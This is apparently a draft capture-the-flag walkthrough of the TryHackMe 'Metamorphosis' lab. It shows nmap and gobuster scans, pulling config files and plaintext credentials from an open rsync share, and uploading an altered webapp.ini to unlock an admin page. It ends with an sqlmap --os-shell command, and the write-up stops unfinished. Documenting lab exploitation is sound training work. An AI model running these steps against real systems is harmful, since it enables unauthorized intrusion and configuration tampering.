---
title: "Tryhackme Metamorphosis"
date: 2021-08-16T15:55:27+05:30
draft: true
toc: false
image: ""
tags: []
categories: []
---

First we start with the basic nmap scan 

root@kali:~/tryhackme/metamorphosis#nmap -sC -sV  10.10.97.133
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-12 11:32 IST
Nmap scan report for 10.10.97.133 (10.10.97.133)
Host is up (0.16s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f7:0f:0a:18:50:78:07:10:f2:32:d1:60:30:40:d4:be (RSA)
|   256 5c:00:37:df:b2:ba:4c:f2:3c:46:6e:a3:e9:44:90:37 (ECDSA)
|_  256 fe:bf:53:f1:d0:5a:7c:30:db:ac:c8:3c:79:64:47:c8 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp open  rsync       (protocol version 31)
Service Info: Host: INCOGNITO; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 13s, deviation: 0s, median: 13s
|_nbstat: NetBIOS name: INCOGNITO, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: incognito
|   NetBIOS computer name: INCOGNITO\x00
|   Domain name: \x00
|   FQDN: incognito
|_  System time: 2021-08-12T06:03:04+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-12T06:03:04
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.22 seconds

Now accessing  the web page at port 80 we get default | Apache2 Ubuntu Default Page |


Now using gobuster 

root@kali:~/tryhackme/metamorphosis/conf#gobuster dir -u 10.10.97.133 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.97.133
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2021/08/12 11:04:29 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 10818]
/admin                (Status: 301) [Size: 312] [--> http://10.10.97.133/admin/]
/inde.html            (Status: 200) [Size: 10918]                               
Progress: 56672 / 882244 (6.42%)               

Now going to http://10.10.97.133/admin

We get 403 Forbidden ...

accessing the source code we get -- make sure admin fuctionality can only be used in development mode --------

Now we have port 873 running which is Rsync you can read more about this here https://book.hacktricks.xyz/pentesting/873-pentesting-rsync

Now enumerate the rync module using 

rsync -rdt rsync://10.10.38.244:873

we get | Conf            All Confs |

now listing content of Conf and dowloading its all file to local machine ..

rsync -rdt rsync://10.10.38.244:873/Conf
drwxrwxrwx          4,096 2021/04/11 01:33:08 .
-rw-r--r--          4,620 2021/04/10 01:31:22 access.conf
-rw-r--r--          1,341 2021/04/10 01:26:12 bluezone.ini
-rw-r--r--          2,969 2021/04/10 01:32:24 debconf.conf
-rw-r--r--            332 2021/04/10 01:31:38 ldap.conf
-rw-r--r--         94,404 2021/04/10 01:51:57 lvm.conf
-rw-r--r--          9,005 2021/04/10 01:28:40 mysql.ini
-rw-r--r--         70,207 2021/04/10 01:26:56 php.ini
-rw-r--r--            320 2021/04/10 01:33:16 ports.conf
-rw-r--r--            589 2021/04/10 01:31:07 resolv.conf
-rw-r--r--             29 2021/04/10 01:32:56 screen-cleanup.conf
-rw-r--r--          9,542 2021/04/10 01:30:59 smb.conf
-rw-rw-r--             72 2021/04/11 01:33:06 webapp.ini

Downloading .......
rsync -av rsync://10.10.38.244:873/Conf ./conf

now reading all the files we have webapp.ini file 

cat webapp.ini 
[Web_App]
env = prod
user = tom
password = theCat

[Details]
Local = No


now the env variable is set to prod .... change this to dev(for development )

and uploading back the new webapp.ini file to server ...

rsync -av webapp.ini rsync://10.10.101.93:873/Conf/webapp.ini  

Now accessing the page http://10.10.101.93/admin/

we get 2.png

now accessing this using brupsuite and saving the request to use the sqlmap --------


sqlmap -r req.txt --level 3 --risk 3 --batch --os-shell


we get permission denied when try to run these command ..
and it is confirm the tcp dump was running using linpeas..

